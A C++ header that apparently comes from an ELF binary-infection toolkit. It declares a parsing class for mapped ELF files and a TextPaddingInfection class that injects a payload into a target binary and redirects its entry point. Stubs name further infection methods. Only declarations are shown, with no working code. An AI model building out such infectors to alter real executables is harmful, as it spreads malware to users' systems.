#ifndef ZKELF_HH
#define ZKELF_HH

#include "zkexcept.hh"
#include "zktypes.hh"
#include <cstddef>
#include <cstdlib>
#include <cstdint>
#include <elf.h>
#include <new>
#include <string.h>
#include <iostream>
#include <exception>
#include <fcntl.h>
#include <assert.h>
#include <stdexcept>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>

#define PAGE_SIZE   sysconf(_SC_PAGESIZE);

namespace Binary{
    /* class which defines important parts of an elf binary */
    class Elf {
        protected:
            int     elf_fd;
            /* memory mapped elf binary */
            void    *elf_memmap;
            /* load address of elf */
            u64     elf_baseaddr;
            /* elf header */
            Ehdr    *elf_ehdr;
            /* elf program header table */
            Phdr    *elf_phdr;
            /* elf section header table */
            Shdr    *elf_shdr;
            /* elf symbol table */
            Symtab  *elf_symtab;
            /* elf symbol string table */
            Strtab  elf_strtab;
            /* elf dynamic symbol table optional */
            Dynamic *elf_dynamic;
            /* elf dynamic symtab optional */
            Symtab  *elf_dynsym;
            /* elf dynamic string table optional */
            Strtab  elf_dynstr;

            enum {
                SYMTAB_INDEX = 0, STRTAB_INDEX, SHSTRTAB_INDEX, DYNAMIC_INDEX,
                DYNSYM_INDEX, DYNSTR_INDEX, SIZE,
            };

            int elf_indexes[SIZE];
        public:
            const char *elf_pathname;
            size_t  elf_size;

            Elf();
            Elf(const char *pathname);
            ~Elf();
            void OpenElf(void);
            void LoadFile(void);
            void LoadDynamicData(void);
            bool VerifyElf(void) const;
            void RemoveMap(void);

            /* commonly used stuff with infectors */
            u16 GetElfType(void) const;
            int GetSegmentIndexbyAttr(u32 type, u32 flags) const;
            int GetSectionIndexbyAttr(u32 tyoe, u32 flags) const;
            int GetSymbolIndexbyName(const char *name) const;
            int GetDynSymbolIndexbyName(const char *name) const;
            int GetSectionIndexbyName(const char *name) const;
            void *ElfRead(off_t readoff, size_t size) const;
            void ElfWrite(void *buffer, off_t writeoff, size_t size) const;
    };

    /* text padding infection */
    class TextPaddingInfection : public Elf{
        private:
            void    *tpi_payload;
            size_t  tpi_payload_sz;
            u8      tpi_magic[MAGIC_LEN];
            u8      tpi_org_entry[ADDR_LEN];
            Addr    tpi_fake_entry;
        public:
            TextPaddingInfection(const char *target);
            ~TextPaddingInfection();
            /* 
             * re-alloc space for a new payload with a modified
             * return address. return address = tpi_org_entry
             */
            void SetPayload(u8 *payload, size_t payload_sz);
            /* find a freespace and set tpi_fake_entry */
            off_t FindFreeSpace(void);
            void InjectPayload(off_t writeoff) const;
    };

    /* data segment infection */

    /* reverse text padding infection */

    /* patch addresses and shit */
    void PatchAddress(u8 *buffer, size_t len, u8 *addr, u8 *magic);

};

#endif /* ZKELF_HH */
